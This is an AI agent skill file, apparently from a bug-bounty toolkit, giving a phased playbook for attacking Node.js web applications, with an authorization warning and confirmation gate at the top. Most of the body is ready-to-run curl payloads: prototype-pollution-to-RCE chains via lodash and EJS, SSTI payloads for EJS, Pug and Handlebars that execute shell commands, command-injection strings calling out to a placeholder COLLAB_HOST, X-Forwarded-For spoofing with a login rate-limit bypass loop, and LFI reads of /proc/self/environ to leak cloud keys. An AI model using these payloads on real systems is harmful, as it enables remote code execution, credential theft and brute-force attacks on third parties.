---
name: hunt-nodejs
description: Hunt Node.js specific vulnerabilities
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, snyk_research, portswigger_research
report_count: 24
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-NODEJS — Node.js Specific Vulnerabilities

## Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

## Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

## Phase 1 — Fingerprint

```bash
# Confirm Node.js/Express
curl -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

# Check for package.json / node_modules exposure
curl -s "https://$TARGET/package.json"
curl -s "https://$TARGET/package-lock.json"
curl -s "https://$TARGET/node_modules/.package-lock.json"

# Error-based version detection
curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

## Phase 2 — Prototype Pollution Detection

```bash
# JSON body injection — test if __proto__ is accepted
curl -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# Constructor prototype
curl -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# URL query param injection (qs library)
curl -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

# Confirm pollution: does a subsequent request reflect the polluted key?
curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
```

---

## Phase 3 — Prototype Pollution → RCE Chain

```bash
# If pollution is confirmed, attempt to reach dangerous sinks

# Sink 1: child_process via options.shell pollution
curl -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

# Sink 2: lodash template pollution (CVE-2021-23337)
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

# Sink 3: ejs template options pollution
# If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

# OOB confirmation — check Interactsh for callback
```

---

## Phase 4 — Express Trust Proxy Abuse

```bash
# If Express has trust proxy enabled, X-Forwarded-For is trusted
# Test: does spoofed IP bypass IP-based rate limiting or allowlist?

# Spoof IP to 127.0.0.1 (localhost bypass)
curl -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

# Spoof to internal IP range
curl -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Rate limit bypass via rotating fake IPs
for i in $(seq 1 50); do
  curl -s https://$TARGET/api/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

---

## Phase 5 — Template Engine SSTI (EJS / Pug / Handlebars)

```bash
# EJS SSTI — if user input reaches EJS template context
# Test basic: <%= 7*7 %> should return 49
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

# EJS RCE payload
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

# Pug SSTI
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

# Handlebars — prototype pollution via template
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
```

---

## Phase 6 — child_process Command Injection

```bash
# Look for endpoints that run shell commands with user input
# Signals: /api/convert, /api/exec, /api/ping, /api/scan

# Basic injection test
curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

# OOB via DNS
curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

## Phase 7 — /proc/self/environ Exfil

```bash
# If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl -s "https://$TARGET/api/file?path=/proc/self/environ"
curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

# Also check:
curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---

## Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---

## Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
